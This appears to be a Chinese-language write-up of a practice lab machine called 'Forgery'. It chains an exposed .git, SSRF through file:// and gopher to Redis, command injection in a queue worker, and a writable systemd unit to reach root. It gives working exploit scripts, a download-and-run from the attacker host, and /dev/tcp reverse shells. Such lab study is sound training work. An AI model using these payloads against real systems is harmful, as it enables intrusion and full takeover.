+# 信息收集
+
+```bash
+IP=192.168.205.205
+nmap -p- $IP
+...
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+...
+```
+
+只有 SSH 和 HTTP。80 端口跑的是 Apache/2.4.67 on Debian，直接看 Web。
+
+页面是一个带浏览器截图的 URL 请求工具，地址栏输入地址能看到网页预览。跑一下目录扫描。
+
+```bash
+dirsearch -q -u http://$IP/
+```
+
+扫出来 `.git` 目录完整暴露，还有一个 `api.php`。
+
+```bash
+curl -s http://$IP/api.php
+```
+
+返回 `缺少参数: url`，是个接收 URL 参数的接口。`.git` 暴露了，先把源码拖下来。
+
+# 源码还原
+
+## git-dumper 拉取
+
+```bash
+git-dumper http://$IP/ /tmp/205/
+cd /tmp/205
+git log --all --oneline
+```
+
+```
+f537279 (HEAD -> master) Backup request handler
+15689a1 Initial commit
+```
+
+只有两个 commit，checkout 出来 `api.php`、`browser.png`、`index.html`，没有别的东西。
+
+## api.php 关键逻辑
+
+```php
+$url = escapeshellarg($_GET['url']);
+$redis = new Redis();
+$redis->connect('127.0.0.1', 6379);
+$requestId = uniqid("", true);
+$requestData = json_encode(['id' => $requestId, 'url' => $url]);
+$redis->lPush('URLqueue', $requestData);
+```
+
+PHP 端把用户传入的 URL 用 `escapeshellarg` 包一层，序列化成 JSON 推进 Redis 队列 `URLqueue`，然后轮询等结果返回。后端肯定还有个 worker 从队列取 URL 去请求，但 git 里没有这个 worker 的源码，先记下来。
+
+# SSRF 探测
+
+`api.php` 接收 URL 去请求，这是个典型 SSRF 场景。先试 `file://` 读本地文件：
+
+```bash
+curl -s "http://$IP/api.php?url=file:///var/www/html/api.php" | base64 -d
+```
+
+响应是 base64 编码的，解码后能读到 `api.php` 自身，`file://` 协议可用。
+
+> 这里有个教训：我当时也顺手读了 `/etc/passwd`，但没仔细看内容就继续往下打了。后来回头才发现 yepian 用户的密码字段是空的（`yepian::1000:1000::/home/yepian:/bin/rbash`，第二个字段没有 `x` 占位），意味着可以直接 SSH 无密码登录。如果当时细看了，横向移动那步能少绕一段路。
+
+再试 gopher 打内网 Redis。写个脚本生成 gopher payload 发 Redis INFO 命令，保存为 `info.py`：
+
+```python
+import urllib.parse
+
+def gen_redis_cmd(*args):
+    p = f"*{len(args)}\r\n"
+    for a in args:
+        p += f"${len(a)}\r\n{a}\r\n"
+    return p
+
+payload = gen_redis_cmd("INFO", "server")
+gopher = "gopher://127.0.0.1:6379/_" + urllib.parse.quote(payload)
+final = urllib.parse.quote(gopher)
+print(f"http://192.168.205.205/api.php?url={final}")
+```
+
+```bash
+python3 info.py | xargs curl -s | base64 -d
+```
+
+确认 Redis 8.0.2 可达。试了 CONFIG SET 写 webshell 到 `/var/www/html`：
+
+```
+-ERR CONFIG SET failed (possibly related to argument 'dir') - can't set protected config
+```
+
+Redis 8 默认启用了 protected config，`dir` 和 `dbfilename` 都改不了，写文件这条路走不通。
+
+# 发现 Worker
+
+Redis 写文件不行，回头去找那个从队列取数据的 worker。既然 `file://` 能读文件，先看 systemd 服务列表里有什么：
+
+```bash
+curl -s "http://$IP/api.php?url=file:///etc/systemd/system/" | base64 -d
+```
+
+输出里有个 `handler.service`，读它：
+
+```bash
+curl -s "http://$IP/api.php?url=file:///etc/systemd/system/handler.service" | base64 -d
+```
+
+```
+ExecStart=/usr/bin/python3 /opt/handler/main.py
+User=www-data
+```
+
+worker 在 `/opt/handler/main.py`，以 www-data 跑。继续读源码：
+
+```bash
+curl -s "http://$IP/api.php?url=file:///opt/handler/main.py" | base64 -d
+```
+
+关键部分：
+
+```python
+def ProcessUrl(url):
+    cmd = f"curl -s --max-time 1 --url {url} 2>&1"
+    proc = subprocess.run(cmd, shell=True, capture_output=True)
+    return base64.b64encode(proc.stdout).decode('utf-8')
+```
+
+命令注入点就在这。Python 端从 Redis 队列取出 JSON 里的 `url` 字段，直接用 f-string 拼进 shell 命令，`shell=True` 执行，没有任何过滤。
+
+PHP 端的 `escapeshellarg` 只保护从 `api.php` 正常提交的路径。绕过 `api.php`，用 gopher 直接往 Redis 队列里塞恶意 JSON，`url` 字段里的命令注入就会被 worker 原样执行。
+
+> 顺带一提，看菜叶片的 WP，他这台机器 `main.py` 是从 git 不可达对象里恢复出来的（`git fsck --unreachable` 列出被删引用的 commit，再 `git show` 拿源码）。git-dumper 基于引用关系遍历，遇到被 reset 或删分支的 commit 就会遗漏，那种情况下 wget 递归下载整个 `.git` 再 `git fsck` 更稳妥。我这条路是 SSRF 直接读 `/opt/handler/main.py`，殊途同归。
+
+# 初始突破
+
+## RESP 协议
+
+Redis 客户端与服务端通信用 RESP 协议，命令以数组形式发送。比如 `LPUSH URLqueue "somedata"` 对应：
+
+```
+*3\r\n
+$5\r\nLPUSH\r\n
+$8\r\nURLqueue\r\n
+$N\r\n{json}\r\n
+```
+
+curl 不支持直接发 RESP，但 `gopher://` 可以发任意 TCP 数据。格式是 `gopher://host:port/_<URL编码的字节序列>`，第一个字符 `_` 会被丢弃，后面的内容原样发送。
+
+## 构造 Exploit
+
+Kali 上准备反弹 shell 脚本，保存为 `rev.sh`：
+
+```bash
+bash -i >& /dev/tcp/192.168.205.128/8888 0>&1
+```
+
+开 HTTP 服务托管：
+
+```bash
+python3 -m http.server 80
+```
+
+写 exploit 脚本，保存为 `exploit.py`：
+
+```python
+import urllib.parse
+import json
+
+def gen_redis_cmd(*args):
+    p = f"*{len(args)}\r\n"
+    for a in args:
+        p += f"${len(a)}\r\n{a}\r\n"
+    return p
+
+req_id = "pwned002"
+malicious_url = "http://x;curl http://192.168.205.128/rev.sh -o /tmp/rev.sh;bash /tmp/rev.sh"
+data = json.dumps({"id": req_id, "url": malicious_url})
+payload = gen_redis_cmd("LPUSH", "URLqueue", data)
+gopher = "gopher://127.0.0.1:6379/_" + urllib.parse.quote(payload)
+final = urllib.parse.quote(gopher)
+print(f"http://192.168.205.205/api.php?url={final}")
+```
+
+这段绕过了 `api.php` 的 `escapeshellarg`，直接往 Redis 队列塞了条恶意 JSON。worker 取出来后 `url` 字段被拼进 `curl -s --max-time 1 --url http://x;curl ...;bash /tmp/rev.sh 2>&1`，分号后面的命令被 bash 执行。
+
+## 触发反弹
+
+```bash
+nc -lvnp 8888
+```
+
+```bash
+python3 exploit.py | xargs curl -s
+```
+
+监听端收到 shell：
+
+```
+www-data@Forgery:/home$
+```
+
+# 横向移动
+
+## 发现 yepian 用户
+
+```bash
+cat /etc/passwd | grep sh$
+```
+
+```
+root:x:0:0:root:/root:/bin/bash
+yepian::1000:1000::/home/yepian:/bin/rbash
+```
+
+yepian 密码字段为空，无密码。shell 是 `/bin/rbash`。
+
+## rbash 绕过
+
+已经有了 www-data 的 shell，`su` 的时候用 `-s` 参数指定 shell，绕开 rbash：
+
+```bash
+su -s /bin/bash yepian
+```
+
+一步到位拿到 yepian 的 bash shell。
+
+> 如果是按出题预期从 SSH 无密码登 yepian，会直接撞上完整的 rbash 限制：`$PATH` 只有 `/opt/rbash_cmds`，里面没放可用二进制，不能 `cd`、不能用 `/` 指定路径、不能改 `PATH`。菜叶片的 WP 里给了两个解法，一个是 `echo "$(</etc/passwd)"`（echo 是 bash 内建，配合 `$(<file)` 语法糖在无外部二进制情况下读文件），另一个是利用 `/opt/rbash_cmds` 权限 777，往里面软链一个 bash 再登录脱困。我走的 www-data 到 yepian 这条路用不上这些，记一下当扩展。
+
+# 提权
+
+## handler.service 可写
+
+跑 linpeas 发现 `/etc/systemd/system/handler.service` 可写：
+
+```bash
+ls -al /etc/systemd/system/handler.service
+```
+
+```
+-rw-r--r-- 1 yepian yepian 295 Jun  4 09:29 /etc/systemd/system/handler.service
+```
+
+yepian 拥有这个 systemd service 文件，可以直接改。当前 handler 以 www-data 跑，改成 root 配合反弹 shell 就行。
+
+## 修改 service 文件
+
+用 vi 编辑 `/etc/systemd/system/handler.service`：
+
+```ini
+[Unit]
+Description=req handler
+After=network.target
+[Service]
+Type=simple
+User=root
+Group=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.205.128/8888 0>&1'
+Restart=on-failure
+RestartSec=2
+[Install]
+WantedBy=multi-user.target
+```
+
+## 触发
+
+改完 service 文件正常要 `systemctl daemon-reload`，但 yepian 没这权限。有人会想到用 `Restart=on-failure` 杀进程让服务崩溃重启，但 systemd 在 daemon-reload 之前不会重新解析已加载的 service 文件，重启服务也是用内存里的旧配置。没有 reload 权限的话，重启机器是唯一可靠的触发方式。
+
+Kali 上开监听：
+
+```bash
+nc -lvnp 8888
+```
+
+重启靶机，handler 以 root 执行反弹 shell：
+
+```
+root@Forgery:/# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+# Flag
+
+```bash
+cat /home/yepian/user.txt /root/root.txt
+```
+
+```
+flag{user-24900750c5c03ffe834248ba2e145cfa}
+flag{root-3b124dc0b2553d41c27d853b197c1043}
+```
